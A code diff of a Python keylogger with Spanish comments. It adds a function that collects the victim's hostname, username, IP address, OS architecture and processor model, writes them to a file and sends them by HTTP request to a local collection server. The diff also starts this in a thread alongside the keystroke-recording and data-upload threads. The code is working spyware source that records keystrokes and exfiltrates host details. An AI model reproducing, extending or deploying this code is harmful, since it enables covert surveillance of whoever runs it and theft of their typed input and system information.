@@ -33,19 +33,6 @@ def key_recorder(key):
        # SOLO PARA LA FASE DE PRUEBAS, permite salir del programa
       if key == "'\\x03'":
             f.close()
-            os.system('whoami')
-            hostname = socket.gethostname()
-            IP = socket.gethostbyname(hostname)
-            architecture=platform.architecture()
-            processor=platform.processor()
-            userName = getpass.getuser()
-            print("**********")
-            print(hostname)
-            print(IP)
-            print(architecture)
-            print(processor)
-            print(userName)
-            print("**********")
             quit()
 
       # Usando expresiones regulares buscamos palabras que sean
@@ -103,14 +90,32 @@ def uploadData():
       
       print('me morí')
 
+def uploadSysInfo():
+      file= open('systemInfo.txt','w')
+      hostname = socket.gethostname() # Nombre de la PC
+      text = ''
+      text = text + 'Nombre de la PC: ' + str(socket.gethostname())+ '%'
+      text = text + 'Nombre del usuario: ' + str(getpass.getuser()) + '%'
+      text = text + 'IP: '+ str(socket.gethostbyname(hostname)) + '%'
+      text = text + 'Arquitectura de Python y Sistema Operativo: ' + str(platform.architecture()) + '%'
+      text = text + 'Modelo de procesador: ' + str(platform.processor())
+      file.write(text)
+      print(text)
+      file.close()
+      text = 'var sysInfo = \\`' + text + '\\`'
+      requests.get('http://localhost:5000/uploadSysInfo/' + text.replace('\\','') )
+      
 
 def mainProcess():
       print('Proceso principal.')
       
       p01 = threading.Thread(name='Keylogger', target=keylogger)
       p02 = threading.Thread(name='uploadData', target=uploadData)
+      p03 = threading.Thread(name='uploadSysInfo', target=uploadSysInfo)
 
       p01.start()
       p02.start()
+      p03.start()
 
+#Ejecutando el proceso principal.
 mainProcess()
